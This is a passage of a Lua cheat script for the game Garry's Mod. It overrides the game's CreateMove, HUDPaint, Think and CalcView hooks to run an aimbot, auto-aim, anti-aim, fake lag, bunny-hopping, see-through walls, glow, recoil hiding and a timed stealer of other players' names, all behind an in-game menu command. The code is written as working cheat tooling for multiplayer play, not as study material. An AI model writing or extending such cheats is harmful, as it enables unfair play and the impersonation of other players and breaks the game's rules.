			wep:SetColor(Colour(LocalPlayer():GetObserverTarget()) || Colour(LocalPlayer()))
		else
			local wep = LocalPlayer():GetViewModel();
			wep:SetMaterial("");
			wep:SetColor(Color(255,255,255))
		end
	end
end

local function Laser()
	if (gBool("MISC", "Active") && gBool("MISC", "Laser") && LocalPlayer():Alive() && IsValid(LocalPlayer():GetActiveWeapon()) && IsValid(LocalPlayer():GetViewModel())) then
		local wep = LocalPlayer():GetViewModel();
		if (wep:GetAttachment(1) && wep:GetAttachment(1) != 0 && LocalPlayer():GetActiveWeapon():GetClass() != "weapon_crowbar") then
			cam.Start3D()
				local l1 = gBool("MISC", "ThirdPerson") && LocalPlayer():GetShootPos() || wep:GetAttachment(1).Pos;
				local l2 = gFloat("AIM", "Aiming") && target != nil && GetAimVec(target) || LocalPlayer():GetEyeTrace().HitPos;
				render.DrawLine(l1, l2, Colour(LocalPlayer()))
			cam.End3D()
		end
	end
end

local function Crosshair()
	if (gBool("MISC", "Active") && gBool("MISC", "Crosshair")) then
		LocalPlayer():GetActiveWeapon().DrawCrosshair = false;
		local x1, y1 = ScrW() * 0.5, ScrH() * 0.5;
		local color = Colour(LocalPlayer():GetEyeTrace().Entity);
		if (gOption("MISC", "CrosshairType") == "Simple") then
			surface.SetDrawColor(5, 5, 5);
				surface.DrawOutlinedRect(x1-2.5, y1-2.5, 5, 5);
			surface.SetDrawColor(color);
				surface.DrawRect(x1-1.5, y1-1.5, 3, 3);
		elseif (gOption("MISC", "CrosshairType") == "Generic") then
			surface.SetDrawColor(255, 255, 255);
				surface.DrawLine(x1+5, y1, x1+20, y1);
				surface.DrawLine(x1-5, y1, x1-20, y1);
				surface.DrawLine(x1, y1+5, x1, y1+20);
				surface.DrawLine(x1, y1-5, x1, y1-20);
		end
	end
end

/*
CALCVIEW
*/

local function CalcView(ply, pos, ang, fov)
	local view =
	{
		origin = pos;
	}
	if (gBool("REM", "Active")) then
		if (gBool("REM", "NoVisRecoil") && LocalPlayer():Alive()) then
			view.origin = LocalPlayer():EyePos();
			view.angles = LocalPlayer():EyeAngles();
		end
	end
	if (gBool("MISC", "Active")) then
		if (gBool("MISC", "Fov")) then
			view.fov = fov - (90 - gInt("MISC", "FovInt"));
		end
		if (gBool("MISC", "ThirdPerson") && LocalPlayer():Alive()) then
			view.origin = view.origin-(ang:Forward()*10*gInt("MISC", "ThirdPersonInt"));
		end
	end
	return view;
end

/*
TIMERS
*/

local function NameStealTimer()
	if (gBool("MISC", "Active") && gBool("MISC", "NameStealer")) then
		if (!timer.Exists("NameStealTimer") && gFloat("MISC", "NameStealerInt") == nil) then
			timer.Create("NameStealTimer", gInt("MISC", "NameStealerInt"), 0, NameStealer);
		end
		if (gInt("MISC", "NameStealerInt") != gFloat("MISC", "NameStealerInt")) then
			timer.Adjust("NameStealTimer", gInt("MISC", "NameStealerInt"), 0, NameStealer);
		end
		sFloat("MISC", "NameStealerInt", gInt("MISC", "NameStealerInt"));
	else
		timer.Destroy("NameStealTimer");
	end
end

/*
HOOKING
*/

local oCreateMove = oCreateMove || GAMEMODE.CreateMove;
local oHUDPaint = oHUDPaint || GAMEMODE.HUDPaint;

function GAMEMODE:CreateMove(cmd)
	oCreateMove(cmd);
	FakeView(cmd);
	AimBot(cmd);
	if (cmd:CommandNumber() == 0) then return; end
	BunnyHop(cmd);
	AutoStrafer(cmd);
	GetTarget(cmd);
	AutoPistol(cmd);
	EdgeJump(cmd);
	AutoAim(cmd);
	AutoUse(cmd);
	AutoFlash(cmd);
	NoPunch(cmd);
	FakeLag(cmd);
	AntiAim(cmd);
	MoveFix(cmd);
	ViewFix(cmd);
end

function GAMEMODE:HUDPaint()
	oHUDPaint(self);
	Visuals();
	Laser();
	Crosshair();
end

function GAMEMODE:Move()
	GetCurTime();
end

function GAMEMODE:Think()
	NameStealTimer();
	ASUSWalls();
	Glow();
	Weapon();
end

function GAMEMODE:CalcView(ply, pos, ang, fov)
	return CalcView(ply, pos, ang, fov);
end

function GAMEMODE:ShouldDrawLocalPlayer()
	return gBool("MISC", "Active") && gBool("MISC", "ThirdPerson");
end

function GAMEMODE:PreDrawSkyBox()
	if (!(gBool("MISC", "Active") && gBool("MISC", "Sky"))) then return; end
	if (gOption("MISC", "SkyType") == "None") then
		render.Clear(5, 5, 5, 255);
	elseif (gOption("MISC", "SkyType") == "Rave") then
		render.Clear(math.random(10,255), math.random(10,255), math.random(10,255), 255);
	end
	return true;
end

concommand.Add("Menu", Menu);
